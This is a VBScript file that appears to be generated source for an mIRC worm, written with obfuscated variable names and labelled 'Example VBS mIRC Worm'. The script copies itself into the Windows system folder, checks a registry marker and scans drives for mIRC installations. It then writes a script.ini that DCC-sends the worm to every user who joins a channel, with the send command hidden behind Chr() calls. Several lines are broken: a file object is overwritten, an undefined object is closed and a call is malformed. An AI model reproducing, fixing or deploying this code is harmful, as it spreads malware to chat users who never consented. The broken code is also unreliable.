Set S23806G2 = createobject("scripting.filesystemobject")
T452A7P4 = S23806G2.getspecialfolder(0)
FDLLLUJM = T452A7P4 & "\Example VBS mIRC Worm.vbs"
Set I5V45T38 = createobject("wscript.shell")
S23806G2.copyfile wscript.scriptfullname, FDLLLUJM
If I5V45T38.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Example VBS mIRC Worm\CG26T5U0") <> 1 then
CE644GNE ""
End if

Function CE644GNE(O4N3RPKR)
If O4N3RPKR <> "" Then
HG48H4RN = I5V45T38.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If S23806G2.fileexists("c:\mirc\mirc.ini") Then
O4N3RPKR = "c:\mirc"
ElseIf S23806G2.fileexists("c:\mirc32\mirc.ini") Then
O4N3RPKR = "c:\mirc32"
ElseIf S23806G2.fileexists(HG48H4RN & "\mirc\mirc.ini") Then
O4N3RPKR = HG48H4RN & "\mirc"
ElseIf S23806G2.fileexists(HG48H4RN & "\mirc32\mirc.ini") Then
O4N3RPKR = HG48H4RN & "\mirc"
Else
O4N3RPKR = ""
End If
End If
If O4N3RPKR <> "" Then
Set LQ85AJ31 = S23806G2.CreateTextFile(O4N3RPKR & "\script.ini", True)
LQ85AJ31 = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
LQ85AJ31 = LQ85AJ31 & vbCrLf & "n0=on 1:JOIN:#:{"
LQ85AJ31 = LQ85AJ31 & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
LQ85AJ31 = LQ85AJ31 & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
LQ85AJ31 = LQ85AJ31 & FDLLLUJM
LQ85AJ31 = LQ85AJ31 & vbCrLf & "n3=}"
script.Close
End If
End Function
Function TV84EP48()
On Error Resume Next
Set PJA9279M = S23806G2.Drives
For Each PPQ607UP In PJA9279M
F0ENIK32 = PPQ607UP & " \ "
Call N57ANSRI(F0ENIK32)
Next
End Function

Function N57ANSRI(RL313T15)
SC1I1KGR = RL313T15
Set OTF7KMK3 = S23806G2.GetFolder(SC1I1KGR)
Set HL5C6E1S = OTF7KMK3.Files
For Each MN61AHII In HL5C6E1S
If lcase(MN61AHII.Name) = "mirc.ini" Then
CE644GNE(MN61AHII.ParentFolder)
End If
Next
Set ELESF5I5 = OTF7KMK3.Subfolders
For Each B08J55U9 In ELESF5I5
Call (B08J55U9.path)
Next
End function
